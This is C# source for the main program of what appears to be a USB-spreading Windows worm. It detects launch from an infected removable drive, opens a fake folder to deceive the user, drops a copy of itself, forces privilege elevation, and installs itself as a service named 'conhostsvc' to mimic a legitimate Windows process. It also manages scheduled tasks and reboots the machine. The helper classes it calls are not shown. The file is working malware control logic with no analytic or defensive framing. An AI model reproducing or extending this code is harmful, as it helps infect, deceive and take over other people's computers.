using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.ServiceProcess;

namespace zort
{
    class Program : ServiceBase
    {
        public const string SERVICE_NAME = "conhostsvc";
        public const string TASK_NAME = "PookieBearUwU";
        public Program()
        {
            ServiceName = SERVICE_NAME;
        }

        public enum ExecutionState
        {
            Usb,
            Pookie,
            Service,
            Unknown
        }

        public static bool IsTaskSet()
        {
            using (var taskService = new Microsoft.Win32.TaskScheduler.TaskService())
            {
                var task = taskService.FindTask(TASK_NAME);
                return task != null;
            }
        }

        static void Main(string[] args)
        {
            Program program = new Program();
            if (Environment.UserInteractive)
            {
                // Run as console application
                program.OnStart(args);
                Console.WriteLine("Press any key to stop...");
                Console.ReadKey();
                program.OnStop();
            }
            else
            {
                // Run as Windows Service
                Run(program);
            }
        }

        private static ExecutionState GetExecutionState()
        {
            if (RemovableInfector.IsRunningFromInfectedUsb()) return ExecutionState.Usb;
            if (PookieHelper.AmIPookie()) return ExecutionState.Pookie;
            if (ServiceHelper.AmIService()) return ExecutionState.Service;
            return ExecutionState.Unknown;
        }

        private void UsbRoutine()
        {
            RemovableInfector.OpenFakeFolderIfRunningFromInfectedUsb();
            if (PookieHelper.PookieExists())
            {
                if (!PookieHelper.IsPookieRunning())
                {
                    string pookiePath = PookieHelper.GetPookiePath();
                    Process.Start(pookiePath);
                }
                Exit();
            }
            else
            {
                PookieHelper.CreatePookie();
                string pookiePath = PookieHelper.GetPookiePath();
                ElevationHelper.ForceElevate(pookiePath);
                Exit();
            }
        }

        protected override void OnStart(string[] args)
        {
            var executionState = GetExecutionState();
            Console.WriteLine($"Execution state: {executionState}");
            switch (executionState)
            {
                case ExecutionState.Usb:
                    UsbRoutine();
                    break;
                case ExecutionState.Pookie:
                    PookieRoutine();
                    break;
                case ExecutionState.Service:
                    Console.WriteLine("YIPPIE!!");
                    break;
            }
        }

        private void PookieRoutine()
        {
            if (PookieHelper.PookieMutex.Exists()) //also creates the mutex
            {
                Console.WriteLine("Pookie mutex exists, exiting.");
                Exit();
            }

            bool isAdmin = ElevationHelper.IsElevated();
            if (isAdmin)
            {
                if (ServiceHelper.IsServiceInstalled())
                {
                    Console.WriteLine("Service is installed.");
                    if (!ServiceHelper.IsServiceRunning())
                    {
                        Console.WriteLine("Service is not running. Starting service...");
                        ServiceHelper.StartService();
                    }
                    else
                    {
                        Console.WriteLine("Service is already running.");
                    }
                    PookieHelper.PookieMutex.Release();
                    Console.WriteLine("Pookie mutex released. Exiting...");
                    Exit();
                    return;
                }

                Console.WriteLine("Service is not installed. Creating clone...");
                string clonePath = ServiceHelper.CreateItITClone();
                Console.WriteLine($"Clone created at path: {clonePath}. Installing service...");
                ServiceHelper.InstallService(clonePath);
                Console.WriteLine("Service installed successfully.");
                PookieHelper.PookieMutex.Release();
                Console.WriteLine("Pookie mutex released.");

                if (PookieHelper.Tasks.StartAtLogon.Exists())
                {
                    Console.WriteLine("StartAtLogon task exists. Removing...");
                    PookieHelper.Tasks.StartAtLogon.Remove();
                }

                if (PookieHelper.Tasks.DeletePookieAtNextLogon.Exists())
                {
                    Console.WriteLine("DeletePookieAtNextLogon task exists. Removing...");
                    PookieHelper.Tasks.DeletePookieAtNextLogon.Remove();
                }

                Console.WriteLine("Creating DeletePookieAtNextLogon task...");
                PookieHelper.Tasks.DeletePookieAtNextLogon.Create();
                Console.WriteLine("Task created successfully. Restarting computer...");
                Util.RestartComputer();
                Console.WriteLine("Restart initiated. Exiting...");
                Exit();
                return;
            }
            else
            {
                string pookiePath = PookieHelper.GetPookiePath(); //also my path!!
                ElevationHelper.ForceElevate(pookiePath);
                PookieHelper.PookieMutex.Release();
                Exit();
                return;
            }
        }

        private void Exit()
        {
            Environment.Exit(0);
        }

        protected override void OnStop()
        {

        }

        protected override void OnPause()
        {

        }

        protected override void OnContinue()
        {

        }
    }
}
